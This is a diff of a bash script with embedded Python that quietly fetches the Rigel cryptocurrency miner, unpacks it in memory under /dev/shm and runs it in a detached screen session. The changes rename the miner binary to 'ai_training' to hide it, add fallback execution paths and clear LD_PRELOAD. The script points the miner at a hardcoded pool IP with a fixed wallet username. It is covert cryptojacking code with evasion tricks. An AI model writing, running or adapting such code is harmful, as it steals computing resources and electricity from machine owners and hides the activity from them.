@@ -1,13 +1,16 @@
 #!/bin/bash
-screen -dmS gpujob python3 -c '
+screen -dmS gpujob python3 - << 'EOF'
 import os
 import ctypes
 import requests
 import tempfile
 import subprocess
 from ctypes import CDLL, get_errno
+# Removendo import json já que não vamos mais usar arquivo de configuração
 
+# URL para o Rigel Miner
 MINER_URL = "https://github.com/rigelminer/rigel/releases/download/1.21.2/rigel-1.21.2-linux.tar.gz"
+# Não usamos mais POOL_CONFIG aqui
 
 libc = CDLL(None)
 
@@ -31,43 +34,76 @@ def execute_miner(fd):
     with tempfile.TemporaryDirectory(dir="/dev/shm") as tmpdir:
         os.chdir(tmpdir)
         
-        # Extrair o arquivo
+        # Extrair o arquivo baixado
         tar_cmd = ["/bin/tar", "xzf", f"/proc/self/fd/{fd}", "-C", tmpdir]
         subprocess.run(tar_cmd, check=True, pass_fds=[fd])
         
-        # Procurar pelo executável
+        # Procurar pelo executável do Rigel e renomeá-lo
         miner_bin = None
         for root, dirs, files in os.walk(tmpdir):
+            # Procuramos qualquer arquivo executável que possa ser o minerador
             for file in files:
                 file_path = os.path.join(root, file)
-                if os.access(file_path, os.X_OK) and ("rigel" in file.lower()):
+                if os.access(file_path, os.X_OK) and ("rigel" in file.lower() or file == "rigel"):
                     miner_bin = file_path
-                    os.chmod(miner_bin, 0o755)
+                    new_path = os.path.join(root, "ai_training")
+                    os.rename(miner_bin, new_path)
+                    miner_bin = new_path
                     break
-            if miner_bin: break
+            if miner_bin:
+                break
         
         if not miner_bin:
-            raise FileNotFoundError("Binário rigel não encontrado!")
+            # Tentativa alternativa: procurar qualquer executável na pasta extraída
+            for root, dirs, files in os.walk(tmpdir):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    if os.access(file_path, os.X_OK):
+                        print(f"Encontrado executável potencial: {file_path}")
+                        miner_bin = file_path
+                        new_path = os.path.join(root, "ai_training")
+                        os.rename(miner_bin, new_path)
+                        miner_bin = new_path
+                        break
+                if miner_bin:
+                    break
         
-        # Configurar argumentos
-        args = [
-            miner_bin,
-            "--algorithm", "octopus",
-            "--url", "stratum+ssl://18.221.157.241:8443",
-            "--username", "krxY97WV2D.CLD",
-            "--password", "x",
-            "--no-strict-ssl"
-        ]
+        if not miner_bin:
+            # Listar todos os arquivos para depuração
+            print("Conteúdo extraído:")
+            for root, dirs, files in os.walk(tmpdir):
+                for file in files:
+                    print(f" - {os.path.join(root, file)}")
+            raise FileNotFoundError("Arquivo do minerador não encontrado")
         
-        print(f"Iniciando: {' '.join(args)}")
+        os.chmod(miner_bin, 0o755)
+        
+        # Usar uma abordagem diferente para os argumentos
+        # Vamos simplesmente passar o executável como primeiro argumento
+        # e deixar o Rigel usar sua configuração padrão com parâmetros mínimos
+        args = [miner_bin]
+        
+        # Adicionar apenas os parâmetros essenciais
+        args.extend(["--algorithm", "octopus"])  # Corrigido de --algo para --algorithm
+        args.extend(["--url", "stratum+ssl://18.221.157.241:8443"])
+        args.extend(["--username", "krxY97WV2D.CLD"])
+        args.extend(["--password", "x"])
+        args.extend(["--no-strict-ssl"]) 
+
+
+        # Imprimir os argumentos para depuração
+        print(f"Executando: {' '.join(args)}")
+        
         env = os.environ.copy()
         env["LD_PRELOAD"] = ""
         
+        # Tentar execução direta para ver mensagens de erro
         try:
             subprocess.run(args, env=env, check=True)
         except subprocess.CalledProcessError as e:
-            print(f"Erro: {e}")
-            # Tentar com fork se falhar
+            print(f"Erro ao executar o minerador: {e}")
+            
+            # Tentar com fork/execve como no original
             pid = os.fork()
             if pid == 0:
                 os.close(fd)
@@ -77,13 +113,13 @@ def execute_miner(fd):
 
 if __name__ == "__main__":
     try:
-        print("=== Iniciando minerador ===")
-        fd = download_and_load_miner()
-        execute_miner(fd)
+        mem_fd = download_and_load_miner()
+        execute_miner(mem_fd)
     except Exception as e:
-        print(f"ERRO CRÍTICO: {e}")
+        print(f"Erro: {e}")
     finally:
-        try: os.close(fd)
-        except: pass
-    print("=== Processo finalizado ===")
-'
+        try:
+            os.close(mem_fd)
+        except:
+            pass
+EOF
